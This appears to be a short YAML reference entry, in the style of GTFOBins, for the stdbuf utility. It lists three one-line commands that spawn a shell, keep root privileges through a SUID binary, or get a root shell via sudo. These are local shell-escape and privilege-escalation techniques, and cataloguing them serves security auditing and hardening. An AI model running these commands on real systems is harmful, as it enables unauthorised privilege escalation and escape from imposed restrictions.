---
functions:
  shell:
    - code: stdbuf -i0 /bin/sh
  suid:
    - code: ./stdbuf -i0 /bin/sh -p
  sudo:
    - code: sudo stdbuf -i0 /bin/sh
---
